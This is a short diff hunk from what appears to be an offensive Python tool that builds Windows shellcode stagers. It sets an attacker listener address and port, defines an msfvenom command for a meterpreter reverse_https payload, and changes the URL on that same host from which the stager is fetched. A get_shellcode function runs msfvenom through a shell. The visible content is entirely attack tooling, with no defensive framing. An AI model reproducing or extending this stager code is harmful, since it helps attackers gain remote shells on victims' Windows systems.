@@ -7,7 +7,7 @@ LHOST = "192.168.49.65"
 LPORT = 443
 BASE_FILENAME = 'win_msf_sliver_stager'
 MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
-STAGER_URL = "http://192.168.49.65/stager.woff"
+STAGER_URL = "http://192.168.49.65/sc"
 
 def get_shellcode(msfvenom_cmd):
   shellcode = subprocess.check_output(msfvenom_cmd, shell=True)
